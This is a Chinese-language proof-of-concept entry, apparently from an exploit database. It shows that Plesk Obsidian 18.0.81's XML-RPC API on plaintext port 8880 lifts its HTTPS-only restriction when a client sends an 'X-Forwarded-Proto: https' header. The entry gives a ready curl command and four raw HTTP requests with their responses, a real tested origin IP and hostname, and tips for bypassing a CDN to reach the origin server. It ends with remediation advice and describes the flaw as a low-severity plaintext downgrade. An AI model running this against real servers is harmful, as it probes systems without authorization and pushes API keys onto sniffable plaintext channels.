# Plesk Obsidian 18.0.81 8880 明文端口 XML-RPC：X-Forwarded-Proto: https 绕过「HTTP 禁止访问 API」限制

- **code**: plesk-8880-xmlrpc-http-only-x-forwarded-proto-bypass
- **kind**: poc
- **category**: protocol
- **component**: Plesk Obsidian（sw-cp-server / XML-RPC API，8880 明文管理端口）
- **versions**: 18.0.81（build 1800261102.16）
- **severity**: low
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: task#12 / finding_id=157（finding_checks.verdict=verified，status=confirmed）。2026-11-11 19:4x-19:5x UTC，本机 curl --noproxy '*' 直连源站 92.205.178.49:8880（Host: old.retro32.com）实测四组对照：① 裸 POST /enterprise/control/agent.php（packet 1.6.9.1 server.get.stat）→ errcode 1006 "Access to API via HTTP is not allowed…Use HTTPS instead."（屏障存在）；② 仅加 X-Forwarded-Proto: https → errcode 1029 "Authentication method is not specified"（明文 packet 已被 XML-RPC API 完整解析）；③ ② + KEY: 假密钥 → errcode 11003 "PleskAPIInvalidSecretKeyException : key is not found"（密钥校验逻辑在明文通道执行）；④ 对照 https://92.205.178.49:8443 同 packet → 1029，与 ② 完全一致。原始响应落盘 /opt/artex/data/tasks/12/i2425/x1006.xml、x1029.xml、x11003.xml、y1029.xml（已复核内容）。判定成立：HTTP-only 策略只看请求头 X-Forwarded-Proto，客户端可自证为 https。
- **path**: pocs/plesk-8880-xmlrpc-http-only-x-forwarded-proto-bypass/plesk-8880-xmlrpc-http-only-bypass.http
- **tags**: plesk, xml-rpc, agent.php, x-forwarded-proto, http-only-bypass, header-trust, tls-downgrade, plaintext, 8880, sw-cp-server, logic
- **created_at**: 2026-11-11T20:00:39.033Z
- **engine**: 92.205.178.49:8880（Host: old.retro32.com）

## 描述

Plesk Obsidian 在 8880 明文管理端口对 XML-RPC API（/enterprise/control/agent.php）实施「禁止 HTTP 访问、必须用 HTTPS」的传输策略，但该判定只读取客户端可控的 X-Forwarded-Proto 请求头，而非实际 TLS 通道。直连源站 8880 并加 X-Forwarded-Proto: https 即可让明文 HTTP 上的 XML-RPC packet 被完整解析与执行（返回 1029/11003，与 8443 HTTPS 语义一致）。影响：API 交互（含 KEY/凭据、密钥校验请求）可被迫走明文通道，网络路径上的第三方可嗅探；不构成认证绕过（仍需合法 KEY 才能调用特权 API）。

## 用法

```
【前置条件】① 目标 8880/tcp 明文 HTTP 可从公网/内网直连（Cloudflare 等 CDN 前置会覆写 X-Forwarded-Proto，此时必须拿到源站 IP 直连并手动带 Host: <vhost>）；② 无需任何凭据即可验证（1029 即证明 packet 已被解析）。
【命令】curl --noproxy '*' -s -D - -H 'Host: <vhost>' -H 'Content-Type: text/xml' -H 'X-Forwarded-Proto: https' --data-binary '<?xml version="1.0" encoding="UTF-8"?><packet version="1.6.9.1"><server><get><stat/></get></server></packet>' http://<origin-ip>:8880/enterprise/control/agent.php
【判据】回 body 含 <errcode>1029</errcode>（或带 KEY 时 <errcode>11003</errcode>）= 绕过成立；仍为 <errcode>1006</errcode> = 该版本/该端口不受此头影响（证伪）。
【对照】去掉 X-Forwarded-Proto 应得 1006；https://<origin-ip>:8443 同 packet 应得 1029，三组一起构成完整证据链。
【注意】KEY 只是触发密钥校验分支，假密钥必然 11003；本条目证明「通道降级可控」，不是认证绕过。
```

## 正文

```
# Plesk 8880 明文端口 XML-RPC — X-Forwarded-Proto 绕过 HTTP-only 限制

## 0. 指纹与定位
- 8843/8443 是 Plesk 的正常管理端口；8880 是其**明文 HTTP 映射**（同一 sw-cp-server 应用）。
- 接口固定：`/enterprise/control/agent.php`，POST `text/xml`，packet 版本 `1.6.9.1`（`1.6.x` 系列通用）。
- 识别响应头：`Server: sw-cp-server`、`X-Powered-By: PleskLin`；登录页为 `/login_up.php`。

## 1. 前置条件
1. `<origin-ip>:8880/tcp` 可直连（本例 92.205.178.49）。若目标套了 Cloudflare/CDN，CDN 会覆写 `X-Forwarded-Proto`，**必须解析源站 IP 直连**，并手动带正确的 `Host: <vhost>`（本例 `old.retro32.com`）。
2. 无需凭据即可完成验证（下列步骤 A/B/C 均未认证）。
3. 目标版本：Plesk Obsidian 18.0.81（build 1800261102.16）。其他版本未验证，判据相同。

## 2. 验证请求（四组对照，缺一不可）

### A. 基线：证明屏障存在
```
POST /enterprise/control/agent.php HTTP/1.1
Host: <vhost>
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?><packet version="1.6.9.1"><server><get><stat/></get></server></packet>
```
预期（实测）：
```
HTTP/1.1 200
<errcode>1006</errcode>
<errtext>Access to API via HTTP is not allowed due to security reasons. Use HTTPS instead.</errtext>
```

### B. 绕过：仅加一个请求头
```
POST /enterprise/control/agent.php HTTP/1.1
Host: <vhost>
X-Forwarded-Proto: https
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?><packet version="1.6.9.1"><server><get><stat/></get></server></packet>
```
预期（实测）：
```
HTTP/1.1 200
<errcode>1029</errcode>
<errtext>Authentication method is not specified</errtext>
```
→ 明文 HTTP 上的 XML-RPC packet 已被完整解析（1018/1029 属于 API 业务层，说明已进到 API 处理流程，而不是被传输策略拦下）。

### C. 证明凭据校验也在明文通道执行
```
POST /enterprise/control/agent.php HTTP/1.1
Host: <vhost>
X-Forwarded-Proto: https
KEY: zzqrandomkey1234567890        # 故意无效的假密钥，仅用于触发密钥校验分支
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?><packet version="1.6.9.1"><server><get><stat/></get></server></packet>
```
预期（实测）：
```
HTTP/1.1 200
<errcode>11003</errcode>
<errtext>PleskAPIInvalidSecretKeyException : key is not found</errtext>
```
→ 用真实 KEY 时，整个 `KEY:` 头与 XML 请求都将以明文在 8880 上传输。

### D. 对照组：与 HTTPS 8443 语义一致
```
POST /enterprise/control/agent.php HTTP/1.1
Host: <vhost>
Content-Type: text/xml

<?xml version="1.0" encoding="UTF-8"?><packet version="1.6.9.1"><server><get><stat/></get></server></packet>
```
发到 `https://<origin-ip>:8443` → `<errcode>1029</errcode>`，与步骤 B 的响应体逐字节一致。

## 3. 判据
- 成立：A=1006 且 B=1029（或 C=11003）且 D=1029。即「仅凭客户端可控头就改变了传输策略判定」。
- 证伪：加 `X-Forwarded-Proto: https` 后仍返回 1006 → 该版本不受此头影响，停止。
- 语义边界：这是**传输策略绕过 / 明文降级**，不是认证绕过——1029 表示仍未认证，特权 API 调用仍需合法 KEY。

## 4. 常见失败原因
1. 走的是 CDN 域名而非源站：Cloudflare 会把 `X-Forwarded-Proto` 覆写成 `http`，必须直连源站 IP + 手动 `Host`（`curl --resolve` 或 `--noproxy '*'`）。
2. 端口搞混：8880 是明文映射，8443 有 TLS；对 8880 用 `https://` 会 TLS 握手失败。
3. packet 版本写成 `1.6.9.1` 以外且结构不合法 → 会得到 1018/ syntax 类错误，先回到标准 packet。
4. 目标走 443 而非 8880：443/8443 走的是认证门（1029 直出），观察不到 1006 屏障，无法证明「绕过」。

## 5. 修复建议
- 传输策略判定应以实际连接 scheme/监听端口为准，不要信任客户端提供的 `X-Forwarded-Proto`（或仅在受信反代列表内接受该头）。
- 直接关闭 8880 明文端口，或在 8880 上拒绝 `/enterprise/control/agent.php`。
```
